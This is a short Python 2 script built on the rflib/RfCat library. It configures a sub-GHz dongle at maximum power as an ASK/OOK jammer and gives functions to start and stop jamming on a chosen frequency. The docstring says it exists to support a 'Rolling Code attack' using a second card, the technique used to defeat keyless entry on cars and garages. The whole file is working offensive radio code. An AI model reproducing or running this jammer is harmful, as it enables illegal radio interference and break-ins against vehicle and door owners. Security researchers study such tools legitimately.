from rflib import *


def setupJammer(idx_value, mdm_rate_jammer):
    '''Used to setup jammer with second card for a Rolling Code attack or single for other attacks'''
    j = RfCat(idx=idx_value)
    j.setMdmModulation(MOD_ASK_OOK)
    j.setMdmDRate(mdm_rate_jammer)# how long each bit is transmited for
    j.setMdmChanBW(60000)# how wide channel is
    j.setMdmChanSpc(24000)
    j.setMaxPower()
    j.setChannel(0)
    return j

def jamming(j, action, frequency, rolling_code):
    j.setFreq(frequency)

    if (action == "start"):
        print "Starting Jamming on: " + str(frequency)
        j.setModeTX() # start transmitting
        if not rolling_code:
            raw_input("Enter to stop jamming")
            print 'done'
            j.setModeIDLE()
    if (action == "stop"):
        j.setModeIDLE() # put dongle in idle mode to stop jamming
        print "Jamming Stopped"
